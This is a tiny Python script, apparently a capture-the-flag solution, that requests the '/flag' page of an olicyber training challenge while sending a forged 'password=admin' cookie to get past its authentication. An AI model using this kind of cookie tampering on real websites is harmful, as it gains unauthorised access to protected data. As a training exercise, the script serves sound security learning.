#!/usr/bin/env python3

import requests

url = 'http://web-05.challs.olicyber.it/flag'
cookie={"password":"admin"}

r=requests.get(url, cookies=cookie)
print(r.text)
